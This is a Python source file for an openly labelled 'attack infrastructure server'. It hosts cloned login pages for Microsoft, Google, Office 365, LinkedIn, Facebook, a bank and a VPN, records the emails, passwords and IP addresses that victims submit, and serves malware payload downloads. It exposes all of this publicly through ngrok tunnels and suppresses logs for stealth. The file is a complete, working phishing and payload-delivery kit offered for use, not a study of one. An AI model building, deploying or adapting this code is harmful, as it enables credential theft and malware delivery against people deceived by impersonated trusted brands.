#!/usr/bin/env python3
"""
LuciferOS Attack Infrastructure Server
Auto-hosts phishing pages, credential harvesters, and payload downloads
"""

import os
import json
import base64
import hashlib
import threading
import subprocess
from pathlib import Path
from datetime import datetime
from flask import Flask, request, render_template_string, send_file, redirect, jsonify
from typing import Dict, Optional
import random
import string

class AttackServer:
    """
    Automated attack infrastructure:
    - Hosts credential harvester pages
    - Serves malware payloads
    - Captures credentials
    - Manages ngrok tunnels for public access
    """
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        
        # Storage paths
        self.base_path = Path.home() / '.lucifera'
        self.harvesters_path = self.base_path / 'harvesters'
        self.payloads_path = self.base_path / 'payloads'
        self.captures_path = self.base_path / 'captures'
        self.logs_path = self.base_path / 'attack_logs'
        
        for p in [self.harvesters_path, self.payloads_path, self.captures_path, self.logs_path]:
            p.mkdir(parents=True, exist_ok=True)
        
        # Server state
        self.app = None
        self.server_thread = None
        self.running = False
        self.port = 8888
        self.ngrok_process = None
        self.ngrok_url = None
        
        # Active campaigns
        self.harvesters = {}  # id -> harvester config
        self.payloads = {}    # id -> payload config
        self.captured_creds = []
        
        # Harvester templates (clone popular login pages)
        self.HARVESTER_TEMPLATES = {
            'microsoft': self._microsoft_template(),
            'google': self._google_template(),
            'outlook': self._outlook_template(),
            'office365': self._office365_template(),
            'linkedin': self._linkedin_template(),
            'facebook': self._facebook_template(),
            'generic': self._generic_template(),
            'bank': self._bank_template(),
            'vpn': self._vpn_template(),
        }
    
    def _microsoft_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>Sign in to your account</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
.logo { font-size: 24px; margin-bottom: 16px; }
.logo img { height: 24px; }
h1 { font-size: 24px; font-weight: 600; margin: 16px 0; }
input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #666; font-size: 15px; box-sizing: border-box; }
input[type="submit"] { background: #0067b8; color: white; border: none; padding: 10px 20px; font-size: 15px; cursor: pointer; width: 100%; margin-top: 20px; }
input[type="submit"]:hover { background: #005a9e; }
.links { margin-top: 20px; font-size: 13px; }
.links a { color: #0067b8; text-decoration: none; }
.error { color: #d83b01; font-size: 13px; display: none; }
</style>
</head><body>
<div class="container">
<div class="logo"><img src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"></div>
<h1>Sign in</h1>
<div class="error" id="error">Your account or password is incorrect.</div>
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="email" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Sign in">
</form>
<div class="links">
<a href="#">Can't access your account?</a><br><br>
<a href="#">Sign in with a security key</a>
</div>
</div>
<script>
if(window.location.search.includes('error=1')){document.getElementById('error').style.display='block';}
</script>
</body></html>'''

    def _google_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>Sign in - Google Accounts</title>
<style>
body { font-family: 'Google Sans', Roboto, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { width: 450px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; }
.logo { text-align: center; margin-bottom: 16px; }
.logo img { height: 24px; }
h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 16px 0 8px; }
.subtitle { text-align: center; font-size: 16px; color: #202124; margin-bottom: 24px; }
input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
input:focus { border-color: #1a73e8; outline: none; }
.forgot { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
.buttons { display: flex; justify-content: space-between; margin-top: 32px; align-items: center; }
input[type="submit"] { background: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
input[type="submit"]:hover { background: #1557b0; }
.create { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
</style>
</head><body>
<div class="container">
<div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" style="height:32px" alt="Google"></div>
<h1>Sign in</h1>
<p class="subtitle">Use your Google Account</p>
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required style="margin-top:24px">
<a href="#" class="forgot">Forgot password?</a>
<div class="buttons">
<a href="#" class="create">Create account</a>
<input type="submit" value="Next">
</div>
</form>
</div>
</body></html>'''

    def _outlook_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>Sign in to Outlook</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #0078d4 0%, #004578 100%); margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { background: white; padding: 40px; width: 400px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
.logo { text-align: center; margin-bottom: 20px; }
h1 { font-size: 24px; text-align: center; margin: 0 0 30px; color: #1b1b1b; }
input[type="email"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 15px; box-sizing: border-box; }
input[type="submit"] { background: #0078d4; color: white; border: none; padding: 12px; font-size: 15px; cursor: pointer; width: 100%; margin-top: 20px; border-radius: 2px; }
</style>
</head><body>
<div class="container">
<div class="logo"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" style="height:40px"></div>
<h1>Outlook</h1>
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Sign in">
</form>
</div>
</body></html>'''

    def _office365_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>Sign in to Office 365</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #f3f3f3; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
.header { display: flex; align-items: center; margin-bottom: 24px; }
.header img { height: 36px; margin-right: 12px; }
.header span { font-size: 20px; font-weight: 600; }
h2 { font-size: 20px; margin: 0 0 24px; font-weight: 600; }
input[type="email"], input[type="password"] { width: 100%; padding: 10px 12px; margin: 12px 0; border: 1px solid #605e5c; font-size: 14px; box-sizing: border-box; }
input[type="submit"] { background: #0078d4; color: white; border: none; padding: 10px; font-size: 14px; cursor: pointer; width: 108px; margin-top: 16px; }
.checkbox { margin: 16px 0; font-size: 13px; }
</style>
</head><body>
<div class="container">
<div class="header"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"><span>Office 365</span></div>
<h2>Sign in</h2>
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="email" name="email" placeholder="someone@example.com" required>
<input type="password" name="password" placeholder="Password" required>
<div class="checkbox"><input type="checkbox" id="keep"> <label for="keep">Keep me signed in</label></div>
<input type="submit" value="Sign in">
</form>
</div>
</body></html>'''

    def _linkedin_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>LinkedIn Login</title>
<style>
body { font-family: -apple-system, system-ui, sans-serif; background: #f3f2ef; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { background: white; padding: 24px; width: 400px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
.logo { text-align: center; margin-bottom: 16px; }
.logo img { height: 34px; }
h1 { font-size: 32px; text-align: center; margin: 0 0 24px; }
input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 12px 16px; margin: 8px 0; border: 1px solid #00000066; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
input[type="submit"] { background: #0a66c2; color: white; border: none; padding: 12px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 16px; border-radius: 24px; }
</style>
</head><body>
<div class="container">
<div class="logo"><img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg" alt="LinkedIn"></div>
<h1>Sign in</h1>
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="text" name="email" placeholder="Email or Phone" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Sign in">
</form>
</div>
</body></html>'''

    def _facebook_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>Log in to Facebook</title>
<style>
body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { display: flex; gap: 80px; align-items: center; }
.left { max-width: 500px; }
.left img { height: 106px; margin-left: -28px; }
.left h2 { font-size: 28px; font-weight: normal; line-height: 32px; }
.right { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 396px; }
input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
input[type="submit"] { background: #1877f2; color: white; border: none; padding: 14px; font-size: 20px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 12px; border-radius: 6px; }
.divider { border-top: 1px solid #dadde1; margin: 20px 0; }
.create { background: #42b72a; color: white; border: none; padding: 12px 16px; font-size: 17px; font-weight: bold; cursor: pointer; border-radius: 6px; display: block; margin: 0 auto; }
</style>
</head><body>
<div class="container">
<div class="left">
<img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
<h2>Connect with friends and the world around you on Facebook.</h2>
</div>
<div class="right">
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Log In">
</form>
<div class="divider"></div>
<button class="create">Create new account</button>
</div>
</div>
</body></html>'''

    def _generic_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>{{ title }}</title>
<style>
body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { background: white; padding: 40px; width: 400px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
.logo { text-align: center; margin-bottom: 24px; }
.logo img { max-height: 60px; max-width: 200px; }
h1 { font-size: 24px; text-align: center; margin: 0 0 24px; color: #333; }
input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
input[type="submit"] { background: #007bff; color: white; border: none; padding: 14px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 16px; border-radius: 4px; }
input[type="submit"]:hover { background: #0056b3; }
</style>
</head><body>
<div class="container">
<div class="logo"><img src="{{ logo_url }}" alt="Logo"></div>
<h1>{{ title }}</h1>
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Sign In">
</form>
</div>
</body></html>'''

    def _bank_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>Online Banking - Secure Login</title>
<style>
body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a3a5c 0%, #0d2137 100%); margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { background: white; padding: 40px; width: 380px; border-radius: 8px; }
.logo { text-align: center; margin-bottom: 20px; }
.secure { background: #e8f5e9; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; color: #2e7d32; margin-bottom: 20px; }
.secure::before { content: "🔒 "; }
h1 { font-size: 22px; text-align: center; margin: 0 0 24px; }
input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
input[type="submit"] { background: #1a3a5c; color: white; border: none; padding: 14px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 16px; border-radius: 4px; }
.help { text-align: center; margin-top: 20px; font-size: 13px; }
.help a { color: #1a3a5c; }
</style>
</head><body>
<div class="container">
<div class="logo"><img src="https://via.placeholder.com/200x50?text=SecureBank" style="height:40px"></div>
<div class="secure">Secure Connection Established</div>
<h1>Online Banking Login</h1>
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="text" name="email" placeholder="User ID" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Log In">
</form>
<div class="help"><a href="#">Forgot User ID?</a> | <a href="#">Forgot Password?</a></div>
</div>
</body></html>'''

    def _vpn_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head>
<title>VPN Gateway - Authentication Required</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { background: #16213e; padding: 40px; width: 400px; border-radius: 8px; border: 1px solid #0f3460; }
.logo { text-align: center; margin-bottom: 20px; color: #e94560; font-size: 24px; }
.warning { background: #ff9800; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; color: #000; margin-bottom: 20px; }
h1 { font-size: 20px; text-align: center; margin: 0 0 24px; color: #eee; }
input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #0f3460; border-radius: 4px; font-size: 15px; box-sizing: border-box; background: #1a1a2e; color: #fff; }
input[type="submit"] { background: #e94560; color: white; border: none; padding: 14px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 16px; border-radius: 4px; }
.info { color: #888; font-size: 12px; text-align: center; margin-top: 16px; }
</style>
</head><body>
<div class="container">
<div class="logo">🔐 Corporate VPN</div>
<div class="warning">⚠️ Session expired. Please re-authenticate.</div>
<h1>VPN Authentication</h1>
<form method="POST" action="{{ callback }}">
<input type="hidden" name="campaign_id" value="{{ campaign_id }}">
<input type="text" name="email" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Connect">
</form>
<div class="info">All connections are logged and monitored.</div>
</div>
</body></html>'''

    def _generate_id(self, length: int = 8) -> str:
        """Generate random ID for campaigns"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def create_harvester(self, template: str = 'microsoft', 
                        redirect_url: str = None,
                        custom_title: str = None,
                        custom_logo: str = None) -> Dict:
        """
        Create a credential harvester page
        Returns the URL to use in phishing emails
        """
        campaign_id = self._generate_id()
        
        # Get template
        if template not in self.HARVESTER_TEMPLATES:
            template = 'generic'
        
        html_template = self.HARVESTER_TEMPLATES[template]
        
        # Store harvester config
        self.harvesters[campaign_id] = {
            'id': campaign_id,
            'template': template,
            'redirect_url': redirect_url or 'https://www.google.com',
            'custom_title': custom_title or 'Sign In',
            'custom_logo': custom_logo or 'https://via.placeholder.com/200x50?text=Logo',
            'created': datetime.now().isoformat(),
            'captures': []
        }
        
        # Save to disk
        config_file = self.harvesters_path / f'{campaign_id}.json'
        with open(config_file, 'w') as f:
            json.dump(self.harvesters[campaign_id], f, indent=2)
        
        # Generate URLs
        local_url = f'http://127.0.0.1:{self.port}/h/{campaign_id}'
        public_url = f'{self.ngrok_url}/h/{campaign_id}' if self.ngrok_url else local_url
        
        return {
            'success': True,
            'campaign_id': campaign_id,
            'template': template,
            'local_url': local_url,
            'public_url': public_url,
            'callback_url': f'/capture/{campaign_id}',
            'note': 'Use public_url in phishing emails if ngrok is running'
        }
    
    def create_payload_link(self, payload_content: bytes, filename: str,
                           auto_execute: bool = False) -> Dict:
        """
        Host a malware payload and return download URL
        """
        payload_id = self._generate_id()
        
        # Save payload
        payload_file = self.payloads_path / f'{payload_id}_{filename}'
        with open(payload_file, 'wb') as f:
            f.write(payload_content)
        
        # Store config
        self.payloads[payload_id] = {
            'id': payload_id,
            'filename': filename,
            'path': str(payload_file),
            'size': len(payload_content),
            'auto_execute': auto_execute,
            'created': datetime.now().isoformat(),
            'downloads': 0
        }
        
        # Generate URLs
        local_url = f'http://127.0.0.1:{self.port}/d/{payload_id}/{filename}'
        public_url = f'{self.ngrok_url}/d/{payload_id}/{filename}' if self.ngrok_url else local_url
        
        return {
            'success': True,
            'payload_id': payload_id,
            'filename': filename,
            'local_url': local_url,
            'public_url': public_url,
            'size': len(payload_content)
        }
    
    def start_server(self, port: int = 8888) -> Dict:
        """Start the attack server using http.server (avoids Flask conflicts)"""
        if self.running:
            return {'success': True, 'message': 'Server already running', 'port': self.port}
        
        self.port = port
        
        # Use simple HTTP server with custom handler
        from http.server import HTTPServer, BaseHTTPRequestHandler
        from urllib.parse import parse_qs, urlparse
        import io
        
        parent = self  # Reference to AttackServer instance
        
        class AttackHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Suppress logging for stealth
            
            def do_GET(self):
                parsed = urlparse(self.path)
                path = parsed.path
                
                # Serve harvester
                if path.startswith('/h/'):
                    campaign_id = path.split('/h/')[1].split('/')[0].split('?')[0]
                    if campaign_id in parent.harvesters:
                        config = parent.harvesters[campaign_id]
                        template = parent.HARVESTER_TEMPLATES.get(
                            config['template'], 
                            parent.HARVESTER_TEMPLATES['generic']
                        )
                        # Simple template substitution
                        html = template.replace('{{ callback }}', f'/capture/{campaign_id}')
                        html = html.replace('{{ campaign_id }}', campaign_id)
                        html = html.replace('{{ title }}', config.get('custom_title', 'Sign In'))
                        html = html.replace('{{ logo_url }}', config.get('custom_logo', ''))
                        
                        self.send_response(200)
                        self.send_header('Content-Type', 'text/html')
                        self.end_headers()
                        self.wfile.write(html.encode())
                        return
                
                # Serve payload
                if path.startswith('/d/'):
                    parts = path.split('/d/')[1].split('/')
                    if len(parts) >= 2:
                        payload_id = parts[0]
                        if payload_id in parent.payloads:
                            config = parent.payloads[payload_id]
                            config['downloads'] += 1
                            
                            print(f"\n📥 PAYLOAD DOWNLOADED! IP: {self.client_address[0]}\n")
                            
                            with open(config['path'], 'rb') as f:
                                content = f.read()
                            
                            self.send_response(200)
                            self.send_header('Content-Type', 'application/octet-stream')
                            self.send_header('Content-Disposition', f'attachment; filename="{config["filename"]}"')
                            self.end_headers()
                            self.wfile.write(content)
                            return
                
                # API endpoints
                if path == '/api/captures':
                    import json
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(parent.captured_creds).encode())
                    return
                
                if path == '/api/stats':
                    import json
                    stats = {
                        'harvesters': len(parent.harvesters),
                        'payloads': len(parent.payloads),
                        'captures': len(parent.captured_creds),
                        'ngrok_url': parent.ngrok_url
                    }
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(stats).encode())
                    return
                
                self.send_response(404)
                self.end_headers()
            
            def do_POST(self):
                parsed = urlparse(self.path)
                path = parsed.path
                
                # Capture credentials
                if path.startswith('/capture/'):
                    campaign_id = path.split('/capture/')[1].split('/')[0]
                    if campaign_id in parent.harvesters:
                        config = parent.harvesters[campaign_id]
                        
                        # Read POST data
                        content_length = int(self.headers.get('Content-Length', 0))
                        post_data = self.rfile.read(content_length).decode()
                        params = parse_qs(post_data)
                        
                        # Extract credentials
                        creds = {
                            'campaign_id': campaign_id,
                            'email': params.get('email', [''])[0],
                            'password': params.get('password', [''])[0],
                            'ip': self.client_address[0],
                            'user_agent': self.headers.get('User-Agent', ''),
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        # Store capture
                        parent.captured_creds.append(creds)
                        config['captures'].append(creds)
                        
                        # Save to disk
                        capture_file = parent.captures_path / f'{campaign_id}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
                        with open(capture_file, 'w') as f:
                            json.dump(creds, f, indent=2)
                        
                        print(f"\n🎯 CREDENTIAL CAPTURED!")
                        print(f"   Email: {creds['email']}")
                        print(f"   Password: {creds['password']}")
                        print(f"   IP: {creds['ip']}\n")
                        
                        # Redirect
                        redirect_url = config.get('redirect_url', 'https://www.google.com')
                        self.send_response(302)
                        self.send_header('Location', redirect_url)
                        self.end_headers()
                        return
                
                self.send_response(404)
                self.end_headers()
        
        # Start server in background thread
        def run_server():
            server = HTTPServer(('0.0.0.0', self.port), AttackHandler)
            server.serve_forever()
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        self.running = True
        
        return {
            'success': True,
            'message': f'Attack server started on port {self.port}',
            'port': self.port,
            'local_url': f'http://127.0.0.1:{self.port}'
        }
    
    def start_ngrok(self) -> Dict:
        """Start ngrok tunnel for public access"""
        try:
            # Kill any existing ngrok
            subprocess.run(['taskkill', '/F', '/IM', 'ngrok.exe'], 
                          capture_output=True, shell=True)
            
            # Start ngrok
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for tunnel to establish
            import time
            time.sleep(3)
            
            # Get public URL from ngrok API
            try:
                import requests
                resp = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
                tunnels = resp.json().get('tunnels', [])
                for t in tunnels:
                    if t.get('proto') == 'https':
                        self.ngrok_url = t.get('public_url')
                        break
                    elif t.get('proto') == 'http':
                        self.ngrok_url = t.get('public_url')
            except:
                pass
            
            if self.ngrok_url:
                return {
                    'success': True,
                    'public_url': self.ngrok_url,
                    'message': 'ngrok tunnel established'
                }
            else:
                return {
                    'success': False,
                    'error': 'Could not get ngrok URL. Is ngrok installed and authenticated?'
                }
                
        except FileNotFoundError:
            return {
                'success': False,
                'error': 'ngrok not found. Install from https://ngrok.com/download'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def stop_ngrok(self):
        """Stop ngrok tunnel"""
        if self.ngrok_process:
            self.ngrok_process.terminate()
            self.ngrok_process = None
        self.ngrok_url = None
        subprocess.run(['taskkill', '/F', '/IM', 'ngrok.exe'], 
                      capture_output=True, shell=True)
    
    def get_captures(self, campaign_id: str = None) -> list:
        """Get captured credentials"""
        if campaign_id:
            return [c for c in self.captured_creds if c['campaign_id'] == campaign_id]
        return self.captured_creds
    
    def get_status(self) -> Dict:
        """Get server status"""
        return {
            'running': self.running,
            'port': self.port,
            'ngrok_url': self.ngrok_url,
            'harvesters': len(self.harvesters),
            'payloads': len(self.payloads),
            'captures': len(self.captured_creds)
        }


# Global instance
_attack_server = None

def get_attack_server() -> AttackServer:
    global _attack_server
    if _attack_server is None:
        _attack_server = AttackServer()
    return _attack_server


if __name__ == '__main__':
    server = get_attack_server()
    
    print("🔥 LuciferOS Attack Server")
    print("=" * 50)
    
    # Start server
    result = server.start_server(8888)
    print(f"Server: {result}")
    
    # Create test harvester
    harvester = server.create_harvester('microsoft')
    print(f"\nHarvester created:")
    print(f"  Local URL: {harvester['local_url']}")
    print(f"  Public URL: {harvester['public_url']}")
    
    print("\nPress Ctrl+C to stop...")
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\nShutting down...")
